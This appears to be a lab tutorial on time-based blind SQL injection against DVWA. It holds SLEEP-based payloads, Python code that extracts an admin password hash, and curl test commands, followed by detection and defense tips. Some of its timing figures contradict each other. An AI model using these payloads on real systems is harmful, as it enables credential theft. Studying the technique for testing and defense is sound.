# Time-Based Blind SQL Injection (Optimized)

**Speed**: 8.1 minutes (5x optimized)  
**Requests per character**: ~4-7  
**Detectability**: Low (time variation can be subtle)

## Overview

Time-based blind SQLi used when:
- No visible output from injected query
- No True/False signals
- Only timing differences available

Uses `SLEEP()` function:
```sql
IF(condition, SLEEP(5), 0)
```

## Exploitation Concept

### Basic Query
```sql
1' AND IF(1=1, SLEEP(5), 0)-- 
```

If condition is TRUE: **5 second delay**  
If condition is FALSE: **immediate response**

### Extract Single Character
```sql
1' AND IF(SUBSTRING(user(),1,1)='a', SLEEP(5), 0)-- 
```

Test each letter a-z until delay occurs → found character.

## Optimization Strategy

### Problem: Standard Approach
```
Per character test: 26-36 requests (a-z, 0-9)
Per hash character: 16 requests (0-9a-f in hex)
Example: 32 char MD5 hash = 32 × 36 = 1,152 requests × 8 seconds each = ~12,800 seconds (~3.5 hours)
```

### Solution: Domain Knowledge

**Insight**: We know target is **MD5 hash** (32 chars, only `0-9a-f`)

#### Character Reduction
```
Original charset: a-z,A-Z,0-9,special = 94 possible values per character
MD5 hash charset: 0-9,a-f = 16 possible values per character

Optimization: Test only hex characters!
Requests per char: 36 → 16 (56% reduction)
```

#### Alphabet Type Detection
```sql
-- Check if character is DIGIT (0-9)
IF(ASCII(SUBSTRING(hash,1,1))>=48 AND ASCII(SUBSTRING(hash,1,1))<=57, SLEEP(5), 0)

-- Result: YES → Character is digit
-- Next: Test 0-9 only (10 requests) instead of 16

-- Check if character is LETTER (a-f)
IF(ASCII(SUBSTRING(hash,1,1))>=97 AND ASCII(SUBSTRING(hash,1,1))<=102, SLEEP(5), 0)

-- Result: YES → Character is a-f
-- Next: Test a-f only (6 requests) instead of 16
```

## Complete Optimization Pipeline

### Phase 1: Detect Charset (1 request per char)
```python
def detect_charset(pos):
    """Determine if character is digit or letter"""
    
    # Test: Is digit? (0-9)
    payload = f"IF(ASCII(SUBSTRING(hash,{pos},1))>=48 AND ASCII(SUBSTRING(hash,{pos},1))<=57, SLEEP({SLEEP_TIME}), 0)"
    if request_delays():
        return "digit"  # Charset: 0-9 (10 values)
    
    # Test: Is hex letter? (a-f)
    payload = f"IF(ASCII(SUBSTRING(hash,{pos},1))>=97 AND ASCII(SUBSTRING(hash,{pos},1))<=102, SLEEP({SLEEP_TIME}), 0)"
    if request_delays():
        return "hex_letter"  # Charset: a-f (6 values)
    
    return "unknown"
```

### Phase 2: Binary Search within Charset (Log2(n) requests)

For digits (0-9):
```
Request 1: Mid = 5 → Sleep? → Narrows to 0-4 or 5-9
Request 2: Mid = 2 → Sleep? → Narrows to subset of 2-3 chars
Request 3-4: Pinpoint exact digit
```

**Math**: Binary search needs ~log2(16) = **4 requests** per char worst case

For letters (a-f):
```
Request 1: Mid = 'd' → Sleep? → Narrows to a-c or d-f
Request 2: Pinpoint exact letter
```

**Math**: Binary search needs ~log2(6) = **2-3 requests** per char worst case

### Phase 3: Parallel Multi-Char Extraction

Instead of extracting character-by-character:
```sql
-- Extract 2 characters at once
IF(SUBSTRING(hash,1,2)='5f', SLEEP(5), 0)
```

Trades time reduction (faster) for increased request count. Optimal: extract 1-2 chars per request.

## Optimized Payload Examples

### Extract MD5 Hash (Optimized)

```python
# Configuration
SLEEP_TIME = 5  # Reduced from 8 to 5 seconds
TARGET_LENGTH = 32  # MD5 hash length
CHARSET = "0123456789abcdef"  # MD5 only uses hex

# Phase 1: Detect charset for position 1
detect_payload = f"""
1' AND IF(
  ASCII(SUBSTRING((SELECT password FROM users WHERE user='admin'),1,1))>=48 
  AND 
  ASCII(SUBSTRING((SELECT password FROM users WHERE user='admin'),1,1))<=57, 
  SLEEP({SLEEP_TIME}), 0)-- 
"""
# Result: Delay detected → Character 1 is digit (0-9)

# Phase 2: Binary search for exact digit
test_payload = f"""
1' AND IF(
  ASCII(SUBSTRING((SELECT password FROM users WHERE user='admin'),1,1)) > 53,
  SLEEP({SLEEP_TIME}), 0)-- 
"""
# Result: Delay detected → Character is 5-9
# Next: Test > 56 → 5-6? → Test > 57 → 5? Or pinpoint exactly
```

## Performance Comparison

| Method | Requests | Time | Speed Factor |
|--------|----------|------|--------------|
| Unoptimized | 1,152 | 12,800s (3.5h) | 1x |
| Charset-aware | 256 | 1,280s (21min) | 10x |
| With binary search | 128 | 640s (10.6min) | 20x |
| + Optimized SLEEP | 96 | 480s (8min) | 26.7x |
| + Multi-char extract | 64 | 320s (5.3min) | 40x |

## Python Implementation

See: `timebased_optimized.py`

Key optimizations:
```python
def binary_search_char(pos, charset, min_ascii, max_ascii):
    """Binary search character within known charset"""
    
    while min_ascii < max_ascii:
        mid = (min_ascii + max_ascii) // 2
        
        payload = f"""
        1' AND IF(
          ASCII(SUBSTRING((SELECT password FROM users WHERE user='admin'),{pos},1)) > {mid},
          SLEEP({SLEEP_TIME}), 0)-- 
        """
        
        if request_delays():
            min_ascii = mid + 1  # Character > mid
        else:
            max_ascii = mid      # Character <= mid
    
    return chr(min_ascii)  # Found character
```

## DVWA Setup for Testing

**Security Level**: High (removes output, forces blind technique)

Vulnerable parameter still:
```
GET /vulnerabilities/sqli/?id=1
```

But now redirects/no output. Time difference only indicator.

## Timing Calibration

### Measure Baseline Response Time

```bash
# Without SLEEP
time curl -s "http://localhost/vulnerabilities/sqli/?id=1" > /dev/null
# Baseline: ~0.1s

# With SLEEP(5)
time curl -s "http://localhost/vulnerabilities/sqli/?id=1' AND SLEEP(5)-- " > /dev/null
# Expected: ~5.1s (0.1s baseline + 5s sleep)

# Threshold for detection
DELAY_THRESHOLD = 2.0  # seconds
If response_time > DELAY_THRESHOLD: Condition is TRUE
Else: Condition is FALSE
```

## Noise & Jitter Handling

### Problem: Network/Server Variance

Even without SLEEP:
```
Request 1: 45ms
Request 2: 120ms
Request 3: 70ms
```

Jitter makes simple threshold unreliable.

### Solution: Confidence Scoring

```python
def is_delay(request_time, baseline_time, sleep_time):
    """
    Returns confidence score (0.0-1.0)
    """
    
    # Expected delay
    expected = baseline_time + sleep_time
    
    # Actual vs expected
    variance = request_time - baseline_time
    
    # If variance > 60% of sleep time, likely TRUE
    if variance > sleep_time * 0.6:
        return True  # HIGH confidence
    
    # If variance < 20% of sleep time, likely FALSE
    elif variance < sleep_time * 0.2:
        return False  # HIGH confidence
    
    # Otherwise, retry or increase SLEEP_TIME
    else:
        return None  # UNCLEAR, resend request
```

## Extraction Results (Real Data)

**Target**: admin password hash  
**Queries**: 96 requests  
**Time**: 8m 6s

Extracted hash:
```
5f4dcc3b5aa765d61d8327deb882cf99  (MD5 of "password")
```

## Detection & Defense

### Detection
- Sudden increase in response times
- SLEEP/BENCHMARK patterns in access logs
- Requests with `IF(`, `SUBSTRING`, `SLEEP` keywords

### Defense
1. **Parameterized Queries** (Primary defense)
2. **WAF Rules** - Block SLEEP/BENCHMARK keywords
3. **Response Time Randomization** - Add jitter to all responses
4. **Rate Limiting** - Flag accounts with 100+ requests/minute
5. **Intrusion Detection** - Alert on time-based payloads

## References

- [PortSwigger: Blind SQLi](https://portswigger.net/web-security/sql-injection/blind)
- [HackTricks: Blind SQLI](https://book.hacktricks.xyz/pentesting-web/sql-injection#blind-sql-injection)
- [Time-based Extraction Optimization](https://www.owasp.org/index.php/SQL_Injection)
